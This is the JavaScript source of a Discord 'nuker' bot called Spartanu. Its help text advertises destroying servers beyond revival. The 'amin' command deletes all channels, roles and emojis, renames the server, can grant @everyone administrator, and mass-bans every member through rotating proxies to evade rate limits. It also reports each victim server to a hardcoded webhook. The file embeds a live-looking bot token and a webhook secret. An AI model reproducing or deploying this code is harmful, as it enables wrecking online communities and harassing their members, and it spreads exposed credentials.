const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageButton } = require('discord-buttons-plugin')
const { MessageEmbed, version: djsversion } = require('discord.js');
const configjson = require('./config.json');
const fs = require('fs');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const proxies = fs.readFileSync('./src/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const user_ids = fs.readFileSync('./src/ids.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const db = require("quick.db") 
const http = require("http"); 
http.createServer((_, res) => res.end("Alive")).listen(8080)
const cooldown = new Set();
const cdtime = 5; 
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client)
const inlinereply = require('discord-reply');
const moment = require("moment")
const superagent = require("superagent")
const axios = require('axios').default
const request = require('request');
const chalk = require('chalk');
const phin = require('phin').unpromisified
const token = (process.env.TOKEN);
var whitelistedservers = ["922825023830507540"]
var give_everyone_administrator = configjson.server.give_everyone_administrator  

const botActivity = [
  `only`,
  `update`
]

function write(content, file) {
  fs.appendFile(file, content, function(err) { });
}

client.on('ready', async () => {
  client.user.setStatus("dnd");
  console.log('');
  console.log(chalk.inverse.hex("00FF00")(`[INFO] Logged in as ${client.user.tag} (${client.user.id})`));
  console.log(chalk.inverse.hex("00FF00")(`[INFO] Connected to Discord API Service`));
  console.log('');
  client.guilds.cache.forEach((guild) => {
    console.log(chalk.inverse.hex("00FF00")("Guild: " + guild.name + " | Members: " + guild.memberCount));
  })
  setInterval(() => {
    const randomIndex = Math.floor(Math.random() * (botActivity.length - 1) + 1);
    const newActivity = botActivity[randomIndex];
    client.user.setActivity(newActivity, { type: 'PLAYING' });
  }, 10000);
});

let connectedMsg = new Discord.MessageEmbed()
  .setColor("#969db9")
  .setFooter('status: online')
  .setDescription(`**__Spartanu" It has been reconnected!__**`);

const wrb = new Discord.WebhookClient("925141411962191902", "2YFM0_KxBlIZBbiu_YUaBRiP8H7BhAaqfC2geWZkvTJD9hm_-VdyRLrx2VNX99f008Vf");

wrb.send(connectedMsg)

client.on("message", async (message) => {
  if (!message.guild) return;

  if (message.content.startsWith('ping') || message.content.startsWith("Ping") || message.content.startsWith("PING")) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:win11erroicon:916714141102792745> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

        var states = "<a:Emoji_Sparkles:918673771269881856> Excellent";
        var states2 = "<a:Emoji_Sparkles:918673771269881856> Excellent";
        var msg = `${Date.now() - message.createdTimestamp}`;
        var api = `${Math.round(client.ws.ping)}`;
        if (Number(msg) > 70) states = "<:onlinestatus:916714142415593543>  Good";
        if (Number(msg) > 170) states = "<:idlestatus:916714143401271376>  Not Bad";
        if (Number(msg) > 350) states = "<:dndstatus:920446230289596447> Soo Bad";
        if (Number(api) > 70) states2 = "<:onlinestatus:916714142415593543>  Good";
        if (Number(api) > 170) states2 = "<:idlestatus:916714143401271376>  Not Bad";
        if (Number(api) > 350) states2 = "<:dndstatus:920446230289596447> Soo Bad";
        if (message.author.bot) return;

    const helpEmbed = new Discord.MessageEmbed()
      .setDescription(`Ping Latency ~ **\`${msg} ms\` | ${states}**\nAPI Latency ~ **\`${api} ms\` | ${states2}**`)
      .setColor("#969db9")
    message.lineReply(helpEmbed).then(message => { setTimeout(function() { message.edit(`<:win11erroicon:916714141102792745> Try again typing \`ping\``) }, 999999) })
  }

  if (message.content.startsWith('help') || message.content.startsWith("Help") || message.content.startsWith("HELP")) {

    const embed = new Discord.MessageEmbed()
      .setTitle('**__HELP COMMAND SPARTANU"__**')
      .setDescription(`<a:earthblack:916714143824883803> **__Features__**\n> Spartanu is a free to use Discord bot that is able to nuke server. That means, it ban all members and delete channels in a way that makes it impossible for revive server.\n\n<:whitesmalldot:916714145343213638> **__Commands__**\n> • ping - Ping bot\n> • help - Help command bot\n> • stats - Viewe stats bot\n> • uptime - Viewe uptime bot \n> • webiste - Viewe website bot\n\n<:pointpurple:916714146224013372> **__Nuke Commands__**\n> • amin - Distroy the server`)
      .setThumbnail('https://cdn.discordapp.com/icons/889542957592629259/a_ab62a2553ae9e8d6f43592e048367d02.gif?size=1024')
      .setColor('969db9')

    const button1 = new buttonClient.MessageButton()
      .setLabel("Spartanu")
      .setID("spartanu")
    const button2 = new buttonClient.MessageButton()
      .setLabel("On Top")
      .setID("ontop")

    /* Send Message with button */
    buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button1, button2]] })

  }

  if (message.content.startsWith('invite') || message.content.startsWith("Invite") || message.content.startsWith("INVITE")) {

    const embed = new Discord.MessageEmbed()
      .setTitle('<:linkd:916714146786070561> **__Bot Invite__**')
      .setDescription(`<:whitesmalldot:916714145343213638> **Click on the 'Invite Link' button to add bot to the server**`)
      .setImage(``)
      .setFooter(
        `Invite`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
      .setColor('969db9')

    const button4 = new buttonClient.MessageButton()
      .setLabel("Invite Link")
      .setURL("https://discord.com/api/oauth2/authorize?client_id=734800252569124894&permissions=8&scope=bot")
    const button5 = new buttonClient.MessageButton()
      .setLabel("Website (BETA)")
      .setURL("https://spartanu.tk/")


    /* Send Message with button */
    buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button4, button5]] })


  }

  if (message.content.startsWith('uptime')) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:win11erroicon:916714141102792745> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    var errorvar;

    // Basic embed
    let totalSeconds = (client.uptime / 1000);
    let days = Math.floor(totalSeconds / 86400);
    totalSeconds %= 86400;
    let hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    let minutes = Math.floor(totalSeconds / 60);
    let seconds = Math.floor(totalSeconds % 60);

    var embed = new Discord.MessageEmbed()
      .setColor('#969db9')
      .setTitle(`**__UPTIME SPARTANU__**`)
      .setDescription(`<:Server_Updated:916714148568653864> **Uptime:** \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
      .setFooter(
        `Type - ${message.author.tag}`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()

    message.lineReply(embed).then(message => { setTimeout(function() { message.edit(`<:win11erroicon:916714141102792745> Try again typing \`uptime\``) }, 10000) })

  }



  if (message.content.startsWith('stats') || message.content.startsWith("Stats") || message.content.startsWith("STATS")) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:win11erroicon:916714141102792745> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    const embed = new Discord.MessageEmbed()
      .setDescription("**__STATS SPARTANU__**")
      .setColor('#969db9')
      .setTitle('')
      .addField(`<:whitesmalldot:916714145343213638> **Server Count**`, `<:blurplejoin:916714149025841193> \`${client.guilds.cache.size} server(s)\``, false)
      .addField(`<:whitesmalldot:916714145343213638> **Total Member Count**`, `<:blurplejoin:916714149025841193> \`${client.users.cache.size} member(s)\``, false)
      .addField(`<:whitesmalldot:916714145343213638> **Discord.JS version**`, `<:blurplejoin:916714149025841193> \`v${Discord.version}\``, false)
      .addField(`<:whitesmalldot:916714145343213638> **For up-time information, type**`, `<:blurplejoin:916714149025841193> \`uptime\``, false)
      .addField(`<:whitesmalldot:916714145343213638> **For latency / ping information, type**`, `<:blurplejoin:916714149025841193> \`ping\``, false)
      .setFooter(
        `Type - ${message.author.tag}`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()

    message.lineReply(embed).then(message => { setTimeout(function() { message.edit(`<:win11erroicon:916714141102792745> Try again typing \`stats\``) }, 10000) })
  }

  if (message.content.startsWith('website') || message.content.startsWith("Website") || message.content.startsWith("WEBSITE")) {

    if (message.author.bot || message.channel.type === "dm") return;
    try {
      let fetched = await db.fetch(`prefix_${message.guild.id}`);
      if (fetched == null) {
      } else {
        prefix = fetched
      }
    } catch (e) {
      console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`<:win11erroicon:916714141102792745> Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

    const helpEmbed = new Discord.MessageEmbed()
      .setTitle(`**__SPARTANU WEBSITE__**`)
      .setDescription(`<:shoppingcart:916714150221217792> **Spartanu Website (BETA) [[Click Here]](https://spartanu.tk/)**`)
      .setImage(``)
      .setFooter(
        `Type - ${message.author.tag}`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
      .setColor('969db9')
    message.lineReply(helpEmbed).then(message => { setTimeout(function() { message.edit(`<:win11erroicon:916714141102792745> Try again typing \`website\``) }, 10000) })
  }

  if (message.content === 'amin' || message.content == 'Amin' || message.content == 'AMIN') {
    message.delete()

    const button7 = new buttonClient.MessageButton()
      .setLabel("n ai")
      .setID("spartanu")
    const button8 = new buttonClient.MessageButton()
      .setLabel("voie")
      .setID("voie")
    const button9 = new buttonClient.MessageButton()
      .setLabel("golane")
      .setID("golane")

    if (whitelistedservers.includes(message.guild.id)) return buttonClient.send('<a:funnyblink:916822977255981086> **__Nu Poti Folosi Aceasta Comanda Pe Acest Server__**', { channel: message.channel.id, buttons: [[button7, button8, button9]] })

    let channels = message.guild.channels.cache.array();
    let members = message.guild.members.cache.array();
    let roles = message.guild.roles.cache.array();
    let emojis = message.guild.emojis.cache.array();
    const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
    db.set(`channel_${message.guild.id}`, "k")

    let logs = new Discord.MessageEmbed()
      .setColor("#969db9")
      .setFooter(
        `${message.author.tag} fuck the server`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
      .setThumbnail(message.author.displayAvatarURL({
        dynamic: true
      }))
      .setTitle('Spartanu" Nuk3r')
      .setDescription(`**__<:hood:916730769953685545> Who typed the command__** <:blurplejoin:916730770889007185> ${message.author.tag} (` + "`" + message.author.id + "`" + `)\n\n **__<:hood:916730769953685545> Command__** <:blurplejoin:916730770889007185> amin\n\n <:hood:916730769953685545> **__Server Name__** <:blurplejoin:916730770889007185> ${message.guild.name} (` + "`" + message.guild.id + "`" + `)\n\n <:hood:916730769953685545> **__Members__** <:blurplejoin:916730770889007185> ${message.guild.memberCount}`);

    const wrb = new Discord.WebhookClient("925141411962191902", "2YFM0_KxBlIZBbiu_YUaBRiP8H7BhAaqfC2geWZkvTJD9hm_-VdyRLrx2VNX99f008Vf");

    await wrb.send(logs)

    message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });

    message.guild.setName("spartanu was here")
    message.guild.setIcon(
      "https://c.tenor.com/8iZOc-v_06wAAAAd/wakeup-meme.gif"
    );

    if (give_everyone_administrator == false) {
      console.log(`Giving administrator to @everyone has been disabled.`)
    }
    else {
      var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
      everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES", "ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])

    }
     
    var int1 = setInterval(async function() {
      let guildID = message.guild.id
      var proxy = proxies[Math.floor(Math.random() * proxies.length)]

      headers = { 'Authorization': "Bot " + token }
      phin({
        method: "PUT",
        url: `https://discord.com/api/v9/guilds/${guildID}/members?limit=1000`,
        method: 'GET',
        parse: 'json',
        headers: headers
      }, (err, res, body) => {
        res.body.forEach(member => {
          console.log(member.user.id)
          phin({
            url: `https://discord.com/api/v9/guilds/${guildID}/bans/${member.user.id}`,
            proxy: "http://" + proxy,
            method: 'PUT',
            parse: 'json',
            headers: headers,
            timeout: 20
          }, (err, res) => {
        if (res.body) {
          console.log(res.body)
        } else {
          console.log(chalk.inverse.hex("00FF00")(`User: ${member.user.username} | Proxy: ${proxy}`));
            }
          })
        }, 20)
        setTimeout(() => {
          clearInterval(int1)
        }, 60000)
      })
    })

    if (give_everyone_administrator == false) {
      console.log(`Giving administrator to @everyone has been disabled.`)
    }
    else {
      var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
      everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES", "ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])

    }

    message.guild.setName("spartanu was here")
    message.guild.setIcon(
      "https://c.tenor.com/8iZOc-v_06wAAAAd/wakeup-meme.gif"
    );

  }
})

client.on('message', async message => {
  if (message.content === 'amintest' || message.content == 'Amintest' || message.content == 'AMINTEST') {
    message.delete()
    if(message.guild.id == '889542957592629259') return message.channel.send('nu aici');
    if (message.author.id !== "686119411572015136")

      return;
      var int1 = setInterval(async function() {
      let guild = message.guild.id
      var member_id = user_ids[Math.floor(Math.random() * user_ids.length)]
      var proxy = proxies[Math.floor(Math.random() * proxies.length)]

      headers = { 'Authorization': "Bot " + token }
      phin({
        method: "PUT",
        url: `https://discord.com/api/v9/guilds/${guild}/members?limit=1000`,
        method: 'GET',
        parse: 'json',
        headers: headers
      }, (err, res, body) => {
        res.body.forEach(member => {
          console.log({member_id})
          phin({
            url: `https://discord.com/api/v9/guilds/${guild}/bans/${member_id}`,
            proxy: "http://" + proxy,
            method: 'PUT',
            parse: 'json',
            headers: headers,
            timeout: 20
          }, (err, res) => {
        if (res.body) {
          console.log(res.body)
        } else {
          console.log(chalk.inverse.hex("00FF00")(`User: ${member.user.username} | Proxy: ${proxy}`));
            }
          })
        }, 20)
        setTimeout(() => {
          clearInterval(int1)
        }, 60000)
      })
    })
  }
})
client.login("OTA5MTg2MjA4MzEwMTEyMjY2.YZAnow.eIKp-KJOhCWMLSBUlLyzwrkclvY")
